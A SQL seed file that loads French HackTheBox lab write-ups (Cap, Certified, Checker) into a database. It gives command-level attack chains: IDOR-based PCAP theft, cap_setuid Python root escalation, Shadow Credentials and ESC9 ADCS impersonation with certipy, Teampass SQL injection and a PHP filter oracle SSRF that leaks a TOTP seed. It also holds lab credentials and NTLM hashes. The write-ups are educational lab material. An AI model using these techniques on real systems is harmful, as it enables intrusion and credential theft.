**Recommandation Red Team** : Toujours privilégier l''exploitation manuelle via Python dans des environnements instables, car **Metasploit** peut parfois provoquer un **BSOD (Blue Screen of Death)** sur les cibles x64 si la corruption du pool mémoire ne se déroule pas exactement comme prévu.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Kerberos', 'Privilege Escalation'],
  'Ma phase de reconnaissance commence par un scan **TCP** complet pour identifier la surface d''attaque. J''utilise **Nmap** avec une cadence élevée pour gagner en efficacité, suivi d''un scan de services ciblé. Le scan révèle les ports classiques d''un en...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-blue-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Cap
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Cap',
  'htb-cap',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

#### Énumération des Services
Je débute par un scan **Nmap** complet pour identifier les ports ouverts et les services associés. La machine présente une surface d''attaque standard pour un environnement Linux.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.245

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.245
```

Le scan révèle trois services actifs :
*   **Port 21 (FTP)** : vsFTPd 3.0.3.
*   **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu).
*   **Port 80 (HTTP)** : Serveur web utilisant **gunicorn** (Python).

#### Énumération Web & Découverte d''IDOR
En naviguant sur le port 80, je découvre un dashboard de sécurité nommé "Cap". L''interface permet de visualiser des statistiques réseau et propose une fonctionnalité de **Security Snapshot** via le endpoint `/capture`.

J''observe que lorsqu''une capture est générée, le site redirige vers une URL de type `/data/7`. En testant la navigation vers d''autres indices (ex: `/data/1`, `/data/2`), je confirme la présence d''une vulnérabilité **Insecure Direct Object Reference (IDOR)**. Le serveur ne vérifie pas les autorisations d''accès aux objets (fichiers PCAP) basés sur l''identifiant numérique fourni dans l''URL.

> **Schéma Mental : Exploitation de l''IDOR**
> 1. **Action** : Le serveur génère des fichiers **PCAP** de manière séquentielle.
> 2. **Vecteur** : L''identifiant dans l''URL est prédictible et non protégé.
> 3. **Objectif** : Itérer sur les identifiants inférieurs (historiques) pour récupérer des captures de trafic appartenant à d''autres sessions ou à l''administrateur.

#### Extraction de Données (PCAP Analysis)
Je décide d''automatiser la récupération des fichiers **PCAP** disponibles pour analyser le trafic historique de la machine.

```bash
# Boucle de récupération des PCAPs via l''IDOR
for i in {0..10}; do wget http://10.10.10.245/download/$i -O $i.pcap; done
```

L''analyse du fichier `0.pcap` avec **Wireshark** (ou via `tcpdump`) est fructueuse. Je filtre le trafic pour isoler les sessions **FTP**. Je découvre une tentative de connexion en clair où l''utilisateur **nathan** s''authentifie avec le mot de passe `Buck3tH4TF0RM3!`.

```bash
# Extraction rapide des credentials via tshark
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

#### Premier Shell : SSH Access
Le service **SSH** étant ouvert, je tente une réutilisation de credentials (**Password Reuse**). Les identifiants extraits du trafic réseau s''avèrent valides pour un accès distant.

```bash
ssh nathan@10.10.10.245
# Password: Buck3tH4TF0RM3!
```

Je parviens à obtenir un **Interactive Shell** en tant que **nathan**. Le fichier `user.txt` est présent dans le répertoire personnel de l''utilisateur.

```bash
id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
ls -l /home/nathan/user.txt
```

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois les identifiants de **nathan** (`Buck3tH4TF0RM3!`) extraits du fichier **0.pcap** via l''exploitation de l''**IDOR**, j''établis un accès persistant via **SSH**.

```bash
# Connexion SSH avec les credentials interceptés
sshpass -p ''Buck3tH4TF0RM3!'' ssh nathan@10.10.10.245
```

#### 1. Énumération Post-Exploitation

Je commence par inspecter l''environnement local. Le répertoire personnel de l''utilisateur ne contient aucun vecteur évident, je me tourne donc vers l''analyse de l''application **Flask** qui tourne sur le port 80, située dans `/var/www/html`.

En analysant `app.py`, je remarque un comportement critique dans la fonction `capture()` :

```python
@app.route("/capture")
def capture():
    os.setuid(0) # Passage temporaire en root
    # ... exécution de tcpdump ...
    os.setuid(1000) # Retour à l''utilisateur nathan
```

L''utilisation de `os.setuid(0)` indique que l''interpréteur **Python** possède des privilèges spéciaux, car un utilisateur standard ne peut normalement pas changer son **UID** vers celui de **root** (0).

> **Schéma Mental :**
> Analyse de privilèges : Processus Web (nathan) -> Appel à `setuid(0)` -> Succès ? -> Signifie que le binaire Python possède des **Linux Capabilities** ou un bit **SUID** mal configuré.

#### 2. Identification des Linux Capabilities

Pour confirmer cette hypothèse, j''utilise l''outil **getcap** sur le binaire **Python** utilisé par le système.

```bash
# Vérification des capabilities sur l''interpréteur Python
getcap /usr/bin/python3.8
```

**Résultat :**
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

L''attribut **cap_setuid** est extrêmement dangereux sur un interpréteur de script. Il permet à n''importe quel utilisateur capable d''exécuter ce binaire de manipuler les **UID** du processus et de s''octroyer les privilèges de n''importe quel utilisateur, y compris **root**.

#### 3. Escalade de Privilèges (Privilege Escalation)

Puisque **python3.8** possède la **capability** **cap_setuid**, je peux invoquer l''interpréteur en mode interactif et forcer l''**UID** à 0 avant de spawn un shell.

```python
# Exploitation de cap_setuid via l''interpréteur interactif
python3.8

>>> import os
>>> os.setuid(0) # Élévation immédiate au rang de super-utilisateur
>>> os.system("/bin/bash") # Spawn d''un shell root
```

> **Schéma Mental :**
> Binaire Python (Privilégié via cap_setuid) -> Injection de code Python -> `setuid(0)` -> Le noyau Linux autorise l''action car le binaire a le flag requis -> Le processus devient **Root** -> Exécution de `/bin/bash` héritant des privilèges.

#### 4. Collecte des Flags

Après l''escalade, je vérifie mon identité et récupère les preuves finales.

```bash
# Vérification de l''identité et lecture des flags
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)

cat /home/nathan/user.txt
cat /root/root.txt
```

**Note technique :** Bien que le **GID** (Group ID) reste celui de nathan, l''**UID** 0 est suffisant pour contourner toutes les restrictions du système de fichiers **Linux**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial obtenu en tant que **nathan**, mon objectif est d''identifier un vecteur permettant d''atteindre les privilèges **root**. L''énumération du système de fichiers et des processus révèle que le serveur fait tourner une application **Flask** (Gunicorn). L''analyse du code source de `app.py` montre une fonction `/capture` qui exécute `os.setuid(0)` pour lancer un **tcpdump**. Cette manipulation de l''**User ID** (UID) suggère que l''interpréteur **Python** possède des privilèges spécifiques.

#### Énumération des Linux Capabilities

Sur un système Linux moderne, les **Capabilities** permettent de diviser les privilèges du super-utilisateur en unités distinctes. Si un binaire possède la capacité **cap_setuid**, il peut changer son UID sans être lancé par **root**.

```bash
# Vérification des capabilities sur l''exécutable python
getcap /usr/bin/python3.8

# Output attendu :
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

> **Schéma Mental :**
> 1. **Besoin métier** : L''application web doit capturer des paquets réseau (**Raw Sockets**).
> 2. **Contrainte** : Seul **root** peut faire cela par défaut.
> 3. **Mauvaise solution** : Au lieu de lancer l''app en **root**, le développeur a assigné la **Capability** `cap_setuid` au binaire **Python**.
> 4. **Faille** : N''importe quel utilisateur pouvant exécuter **Python** peut désormais s''octroyer l''UID 0 (**root**).

#### Exploitation du vecteur cap_setuid

Puisque l''interpréteur **Python 3.8** possède la capacité **cap_setuid** dans son **Effective Set** (indiqué par le flag `+eip`), je peux simplement invoquer la bibliothèque `os` pour modifier l''identité du processus courant et spawner un shell privilégié.

```python
# Élévation de privilèges via l''interpréteur interactif
python3 -c ''import os; os.setuid(0); os.system("/bin/bash")''

# Vérification de l''identité
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

Je suis désormais **root**. Le flag final se trouve dans `/root/root.txt`.

---

### Analyse Beyond Root

La compromission totale de **Cap** illustre parfaitement le danger des **Linux Capabilities** lorsqu''elles sont appliquées à des interpréteurs de scripts (Python, Perl, Ruby). 

1.  **Misconfiguration des Capabilities** : L''intention initiale était de permettre à l''application de lier des ports privilégiés (`cap_net_bind_service`) et de capturer du trafic. Cependant, accorder `cap_setuid` à un binaire aussi versatile que **Python** revient à donner un accès **Sudo NOPASSWD** complet. Un attaquant n''a pas besoin d''exploiter une vulnérabilité complexe ; il lui suffit d''utiliser les fonctions natives du langage.
2.  **Principe du Moindre Privilège** : Pour sécuriser cette machine, le développeur aurait dû utiliser des outils spécifiques comme **setcap** uniquement sur le binaire `tcpdump` lui-même, ou mieux, utiliser un **Group** dédié avec des permissions **Sudo** restreintes à une commande précise, plutôt que d''altérer les capacités globales de l''interpréteur système.
3.  **Persistance & Post-Exploitation** : En tant que **root**, l''analyse des fichiers cachés montre que `.bash_history` et `.viminfo` étaient liés à `/dev/null`. C''est une technique anti-forensics courante pour masquer les actions des administrateurs ou des attaquants précédents sur la machine.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'Privilege Escalation'],
  'Je débute par un scan **Nmap** complet pour identifier les ports ouverts et les services associés. La machine présente une surface d''attaque standard pour un environnement Linux. Le scan révèle trois services actifs : * **Port 21 (FTP)** : vsFTPd 3.0...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-cap-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Certified
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Certified',
  'htb-certified',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

La machine **Certified** adopte un scénario de type **Assume-Breach**. Contrairement aux vecteurs d''entrée classiques via des vulnérabilités web, l''exercice débute avec un accès initial via des identifiants utilisateur compromis : `judith.mader` : `judith09`.

#### 1. Énumération Réseau et Services

Je commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque du **Domain Controller**.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.41

# Scan de services détaillé sur les ports identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5357,5985,9389 -sCV 10.10.11.41
```

L''analyse des résultats confirme un environnement **Active Directory** standard :
*   **DNS** (53), **Kerberos** (88), **LDAP** (389/636).
*   **SMB** (445) avec signature activée et requise.
*   **WinRM** (5985) pour la gestion à distance.
*   Le **FQDN** identifié est `dc01.certified.htb` au sein du domaine `certified.htb`.

J''ajoute ces entrées à mon fichier `/etc/hosts` :
```text
10.10.11.41 dc01.certified.htb certified.htb
```

#### 2. Validation des Identifiants et Énumération SMB

Je vérifie la validité des credentials fournis via **NetExec** (anciennement CrackMapExec).

```bash
# Vérification SMB
netexec smb certified.htb -u judith.mader -p judith09

# Vérification WinRM
netexec winrm certified.htb -u judith.mader -p judith09
```

Les identifiants sont valides pour **SMB** mais ne permettent pas une connexion directe via **WinRM**. L''énumération des partages SMB ne révèle que les répertoires par défaut (`NETLOGON`, `SYSVOL`), sans fichiers sensibles apparents.

#### 3. Analyse de la structure Active Directory (Bloodhound)

Pour comprendre les relations de confiance et les permissions (ACL), j''utilise **Bloodhound.py** (version Community Edition) afin de collecter les données du domaine.

```bash
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
```

L''analyse du graphe révèle un chemin d''attaque critique basé sur des mauvaises configurations d''**Object Control** :
1.  `judith.mader` possède le droit **WriteOwner** sur le groupe `Management`.
2.  Le groupe `Management` possède le droit **GenericWrite** sur l''utilisateur `management_svc`.
3.  `management_svc` possède le droit **GenericAll** sur l''utilisateur `ca_operator`.

> **Schéma Mental :**
> L''attaque repose sur une réaction en chaîne d''abus d''ACL (Access Control Lists). En étant **Owner** d''un groupe, je peux modifier ses permissions pour m''octroyer le droit d''y ajouter des membres. Une fois membre du groupe `Management`, j''hérite des droits de **GenericWrite** sur un compte de service, ce qui permet de détourner ce compte via des **Shadow Credentials**.

#### 4. Escalade de Privilèges : Vers le compte Management_SVC

Je procède à l''exploitation de l''ACL **WriteOwner** sur le groupe `Management` pour y injecter mon utilisateur.

**Étape A : Modification de l''Owner du groupe**
J''utilise `owneredit.py` d''**Impacket** pour devenir officiellement propriétaire du groupe.
```bash
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
```

**Étape B : Modification des droits (DACL)**
Maintenant propriétaire, je m''accorde le droit `WriteMembers` via `dacledit.py`.
```bash
dacledit.py -action ''write'' -rights ''WriteMembers'' -principal judith.mader -target Management ''certified''/''judith.mader'':''judith09'' -dc-ip 10.10.11.41
```

**Étape C : Injection dans le groupe**
J''ajoute `judith.mader` au groupe `Management`.
```bash
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

#### 5. Abus des Shadow Credentials et Premier Shell

En tant que membre du groupe `Management`, je dispose du **GenericWrite** sur `management_svc`. Je vais utiliser la technique des **Shadow Credentials** pour obtenir un **TGT** (Ticket Granting Ticket) et extraire le hash NTLM de ce compte sans modifier son mot de passe.

J''utilise **Certipy** pour automatiser l''attaque :
```bash
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```

L''outil génère un certificat, l''injecte dans l''attribut `msDS-KeyCredentialLink` de la cible, s''authentifie, et récupère le hash NTLM :
`management_svc` : `a091c1832bcdd4677c28b5a6a1295584`

Je valide l''accès **WinRM** avec ce hash et j''obtiens mon premier shell interactif.

```bash
# Connexion via Evil-WinRM
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

Une fois connecté, je peux lire le premier flag :
```powershell
type C:\Users\management_svc\desktop\user.txt
```

---

### Énumération du Domaine & Analyse BloodHound

Une fois les identifiants de **judith.mader** validés via **SMB**, j''entame une énumération systématique de l''**Active Directory**. L''objectif est d''identifier des chemins de contrôle d''objets (ACL) exploitables.

```bash
# Collecte des données avec BloodHound.py (branche CE)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Vérification des partages SMB
netexec smb dc01.certified.htb -u judith.mader -p judith09 --shares
```

L''analyse dans **BloodHound** révèle une chaîne de compromission critique :
1. **judith.mader** possède le droit **WriteOwner** sur le groupe **Management**.
2. Le groupe **Management** possède le droit **GenericWrite** sur l''utilisateur **management_svc**.
3. **management_svc** possède le droit **GenericAll** sur l''utilisateur **ca_operator**.

> **Schéma Mental :**
> Judith (WriteOwner) ➔ Groupe Management (GenericWrite) ➔ management_svc (GenericAll) ➔ ca_operator.

---

### Mouvement Latéral : De Judith à management_svc

Pour abuser du droit **WriteOwner**, je dois d''abord m''approprier l''objet, puis modifier ses **DACL** pour m''accorder le droit d''ajouter des membres.

```bash
# 1. Devenir propriétaire du groupe Management
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41

# 2. S''octroyer le droit WriteMembers
dacledit.py -action ''write'' -rights ''WriteMembers'' -principal judith.mader -target Management ''certified''/''judith.mader'':''judith09'' -dc-ip 10.10.11.41

# 3. S''ajouter au groupe Management
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

Maintenant que Judith est membre du groupe **Management**, elle hérite du **GenericWrite** sur **management_svc**. J''utilise une attaque de type **Shadow Credentials** pour obtenir le hash NTLM de ce compte sans changer son mot de passe.

```bash
# Attaque Shadow Credentials via Certipy
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```

Une fois le hash récupéré, je me connecte via **Evil-WinRM** pour obtenir un shell stable.

---

### Pivot vers ca_operator

L''utilisateur **management_svc** a un contrôle total (**GenericAll**) sur **ca_operator**. Je réitère l''attaque **Shadow Credentials** pour pivoter vers ce nouvel utilisateur, qui semble lié à la gestion de l''**ADCS** (Active Directory Certificate Services).

```bash
# Récupération du hash NTLM de ca_operator
certipy shadow auto -username management_svc@certified.htb -hashes :[HASH_NTLM] -account ca_operator -target certified.htb -dc-ip 10.10.11.41

# Vérification des privilèges ADCS pour ca_operator
certipy find -vulnerable -u ca_operator -hashes :[HASH_NTLM] -dc-ip 10.10.11.41 -stdout
```

---

### Escalade de Privilèges : Abus de l''ESC9 (ADCS)

L''énumération **ADCS** révèle un **Certificate Template** nommé `CertifiedAuthentication` vulnérable à l''attaque **ESC9**. Cette vulnérabilité survient lorsque le flag `CT_FLAG_NO_SECURITY_EXTENSION` est présent, empêchant l''inclusion de l''extension de sécurité qui lie le certificat à un **Object SID**.

> **Schéma Mental (ESC9) :**
> management_svc modifie l''UPN de ca_operator ➔ UPN devient "Administrator" ➔ ca_operator demande un certificat ➔ Le CA délivre un certificat au nom de "Administrator" sans vérification de SID ➔ Authentification en tant que Domain Admin.

#### 1. Modification de l''User Principal Name (UPN)
J''utilise les droits de **management_svc** pour changer l''**UPN** de **ca_operator** en `Administrator`.

```bash
certipy account update -u management_svc -hashes :[HASH_NTLM] -user ca_operator -upn Administrator -dc-ip 10.10.11.41
```

#### 2. Demande et Authentification du Certificat
En tant que **ca_operator**, je demande un certificat basé sur le template vulnérable. Le serveur délivre un certificat dont l''identité est simplement `Administrator`.

```bash
# Requête du certificat
certipy req -u ca_operator -hashes :[HASH_NTLM] -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

# Restauration immédiate de l''UPN (Post-Exploitation / Stabilité)
certipy account update -u management_svc -hashes :[HASH_NTLM] -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41

# Authentification via le certificat pour obtenir le hash NTLM de l''Administrateur
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

#### 3. Accès final (Domain Admin)
Avec le hash NTLM de l''administrateur du domaine, je finalise la compromission de la machine.

```bash
evil-winrm -i certified.htb -u administrator -H [ADMIN_NTLM_HASH]
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès établi en tant que **management_svc**, l''objectif est d''atteindre le privilège maximal. L''analyse de l''**Active Directory** révèle que cet utilisateur possède le droit **GenericAll** sur l''utilisateur **ca_operator**, qui lui-même dispose de droits spécifiques sur les services de certificats (**ADCS**).

#### 1. Compromission de ca_operator via Shadow Credentials

Puisque je dispose du contrôle total (**GenericAll**) sur l''objet **ca_operator**, je peux manipuler son attribut `msDS-KeyCredentialLink` pour effectuer une attaque par **Shadow Credentials**. Cela me permet d''obtenir un **TGT** (Ticket Granting Ticket) et d''extraire le hash **NTLM** de l''utilisateur sans changer son mot de passe.

```bash
# Ajout d''un Shadow Credential pour ca_operator
certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
```

Le hash récupéré pour **ca_operator** est : `b4b86f45c6018f1b664f70805f45d8f2`. Bien que ce compte n''ait pas d''accès **WinRM**, il est crucial pour l''étape suivante impliquant **ADCS**.

#### 2. Analyse de la vulnérabilité ADCS ESC9

En énumérant les templates de certificats avec les privilèges de **ca_operator**, j''identifie un vecteur critique : le template **CertifiedAuthentication**.

```bash
# Énumération des templates vulnérables
certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
```

Le template présente une vulnérabilité **ESC9**. Cette configuration est exploitable car :
1. Le groupe `operator ca` (dont fait partie **ca_operator**) possède les droits d''enrôlement (**Enrollment Rights**).
2. Le flag `msPKI-Enrollment-Flag` contient `CT_FLAG_NO_SECURITY_EXTENSION`, ce qui signifie que le certificat ne contiendra pas d''extension de sécurité liant l''identité de manière forte (pas de **SID** inclus).
3. L''utilisateur a le droit de modifier son propre **User Principal Name (UPN)** ou celui d''un compte sur lequel il a un contrôle d''objet.

> **Schéma Mental : Logique de l''attaque ESC9**
> `management_svc` (GenericAll) -> `ca_operator` (UPN modifié en "Administrator") -> Requête de certificat -> Le CA délivre un certificat au nom de "Administrator" sans vérification de SID -> Authentification en tant que Domain Admin.

#### 3. Exploitation finale : Impersonation de l''Administrator

Pour exploiter **ESC9**, je vais modifier l''**UPN** de **ca_operator** pour qu''il corresponde exactement à `Administrator`. Contrairement à une usurpation classique, je ne mets pas le suffixe `@certified.htb` pour éviter les conflits immédiats, car Windows résoudra l''identité localement lors de l''authentification par certificat.

```bash
# Étape A : Modifier l''UPN de ca_operator vers Administrator
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41

# Étape B : Demander un certificat basé sur le template vulnérable
certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

# Étape C : Restaurer l''UPN original (Post-Exploitation Cleanup)
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
```

Une fois le fichier `administrator.pfx` obtenu, je l''utilise pour m''authentifier auprès du **KDC** et récupérer le hash **NTLM** du véritable compte **Administrator**.

```bash
# Authentification via certificat pour obtenir le hash NT de l''admin
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

Le hash final est : `0d5b49608bbce1751f708748f67e2d34`. Je termine la compromission via **Evil-WinRM**.

```bash
# Accès final Root
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

---

### Analyse "Beyond Root"

La compromission de **Certified** illustre parfaitement la dangerosité des configurations **ADCS** modernes combinées à une gestion permissive des ACL d''objets.

1.  **Faiblesse de l''implication UPN** : L''attaque **ESC9** repose sur le fait que l''identité dans le certificat est basée uniquement sur l''**UPN**. Si le flag `CT_FLAG_NO_SECURITY_EXTENSION` est présent, le contrôleur de domaine ne vérifie pas si le **SID** de l''objet correspond à l''identité revendiquée. C''est une faille de conception dans la manière dont Windows mappe les certificats aux comptes utilisateurs lorsque les protections de "Strong Mapping" ne sont pas au niveau 2 (Enforced).
2.  **Chaîne de contrôle d''objets** : La progression `judith.mader` -> `Management Group` -> `management_svc` -> `ca_operator` montre qu''un attaquant ne cherche pas forcément des vulnérabilités logicielles, mais des **Pathways** de droits. Le droit **WriteOwner** initial sur un groupe a permis de réécrire la structure de sécurité de toute la chaîne.
3.  **Shadow Credentials comme vecteur pivot** : L''utilisation systématique de `msDS-KeyCredentialLink` remplace avantageusement le changement de mot de passe, rendant l''attaque plus discrète et évitant de casser les services légitimes qui utiliseraient ces comptes.
4.  **Remédiation** : Pour contrer ce vecteur, il est impératif d''activer le **Strong Certificate Binding** (KB5014754) et de s''assurer qu''aucun template ne possède le flag `msPKI-Enrollment-Flag: 0x00000001` (No Security Extension) tout en permettant aux utilisateurs de modifier leur propre **UPN**.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Web', 'Kerberos', 'Privilege Escalation'],
  'La machine **Certified** adopte un scénario de type **Assume-Breach**. Contrairement aux vecteurs d''entrée classiques via des vulnérabilités web, l''exercice débute avec un accès initial via des identifiants utilisateur compromis : `judith.mader` : `j...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-certified-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Checker
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Checker',
  'htb-checker',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

L''énumération commence par un scan **Nmap** complet pour identifier la surface d''attaque. La machine expose trois ports : **SSH (22)** et deux services **HTTP (80, 8080)**.

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.56

# Scan de services détaillé
nmap -p 22,80,8080 -sCV 10.10.11.56
```

Le port 80 renvoie un **403 Forbidden**, suggérant un **Virtual Hosting**. En ajoutant `checker.htb` au fichier `/etc/hosts`, j''accède à une instance de **BookStack**. Le port 8080 héberge **Teampass**, un gestionnaire de mots de passe open-source.

#### Énumération de Teampass & SQL Injection (CVE-2023-1545)

L''analyse du fichier `changelog.txt` sur le port 8080 indique une version de **Teampass** antérieure à la 3.0.0.23. Cette version est vulnérable à une **SQL Injection** non authentifiée via l''endpoint d''API `/authorize`.

> **Schéma Mental :** L''injection se situe dans le champ `login` d''une requête POST JSON. L''application traite la requête et, en cas de succès ou d''erreur spécifique, peut refléter des données via un **JWT (JSON Web Token)**. En utilisant un `UNION SELECT`, je peux forger un token contenant des données extraites de la base de données (comme les hashs des utilisateurs) dans le champ `public_key` du payload base64 du JWT.

J''utilise un exploit **PoC** pour extraire les hashs de la table `teampass_users` :

```bash
# Extraction des hashs via l''endpoint API vulnérable
bash cve-2023-1545.sh http://checker.htb:8080
```

Résultats obtenus :
*   **admin**: `$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya`
*   **bob**: `$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy`

Le hash de **bob** est craqué via **Hashcat** avec la wordlist `rockyou.txt` :
`bob : cheerleader`

#### Accès Teampass et Pivot vers BookStack

Une fois connecté à **Teampass** avec les identifiants de bob, je récupère deux entrées critiques :
1.  **BookStack login** : `mYSeCr3T_w1kI_P4sSw0rD`
2.  **SSH access (user: reader)** : `hiccup-publicly-genesis`

La tentative de connexion **SSH** échoue car un **Two-Factor Authentication (2FA)** est activé. Je me rabats sur **BookStack** (port 80) où les identifiants de bob fonctionnent.

#### Exploitation SSRF & PHP Filter Oracle (CVE-2023-6199)

**BookStack v23.10.2** est vulnérable à une **SSRF (Server-Side Request Forgery)** via le paramètre `html` de l''endpoint `/ajax/page/<id>/save-draft`. Bien que l''application ne renvoie pas directement le contenu des fichiers, elle est vulnérable à une attaque de type **Blind PHP Filter Oracle**.

> **Schéma Mental :** L''attaque repose sur l''utilisation de **PHP Filters** en chaîne. En envoyant des chaînes de filtres complexes (conversion d''encodages), on peut forcer l''application à générer une erreur ou un délai si un caractère spécifique est présent à une position donnée dans le fichier cible. C''est une exfiltration bit-à-bit basée sur l''état de la réponse HTTP.

Je cible le fichier de configuration **Google Authenticator** de l''utilisateur `reader`. Un article sur le site mentionne des sauvegardes dans `/backup/home_backup/`.

```bash
# Commande type pour exploiter l''oracle via le script de filtrage
python3 filters_chain_oracle_exploit.py --verb PUT \
--file /backup/home_backup/home/reader/.google_authenticator \
--target http://checker.htb/ajax/page/8/save-draft \
--parameter html --headers ''{"X-CSRF-TOKEN": "..."}''
```

Le script extrait le **Secret Seed** du 2FA : `DVDBRAODLCWF7I2ONA4K5LQLUE`.

#### Brèche Initiale : SSH via TOTP

Pour générer le code de validation, je dois synchroniser mon horloge avec celle du serveur, car le **TOTP (Time-based One-Time Password)** est sensible au temps.

```bash
# Récupération de l''heure du serveur et génération du code
oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE --now="$(curl -sI http://checker.htb | grep Date)"
```

Avec le mot de passe `hiccup-publicly-genesis` et le code généré, j''obtiens un shell stable sur la machine en tant que **reader**.

```bash
ssh reader@checker.htb
# Saisie du Password puis du Verification code
```

---

### Énumération Post-Exploitation & Pivot

Une fois l''accès initial obtenu sur l''instance **BookStack**, l''objectif est de pivoter vers un accès système via **SSH**. L''énumération des fichiers de configuration et des bases de données révèle des identifiants pour l''utilisateur `reader`, mais celui-ci est protégé par une **Two-Factor Authentication (2FA)** basée sur **Google Authenticator**.

#### Exploitation SSRF & Blind PHP Filter Oracle
Le serveur exécute **BookStack v23.10.2**, vulnérable à une **SSRF** (**CVE-2023-6199**) via le paramètre `html` du endpoint `/ajax/page/<id>/save-draft`. Comme l''application ne retourne pas directement le contenu des fichiers, j''utilise une technique de **Blind File Oracle** basée sur les **PHP Filter Chains**.

> **Schéma Mental :**
> 1. **Vecteur :** L''application utilise `file_get_contents()` sur une URL fournie.
> 2. **Contrainte :** Pas d''affichage direct (Blind).
> 3. **Technique :** Utiliser des filtres PHP (`convert.iconv.*`) pour générer des erreurs ou des variations de temps/réponse basées sur le premier caractère du contenu du fichier.
> 4. **Cible :** Le fichier de backup `/backup/home_backup/home/reader/.google_authenticator` pour extraire la **TOTP Seed**.

```bash
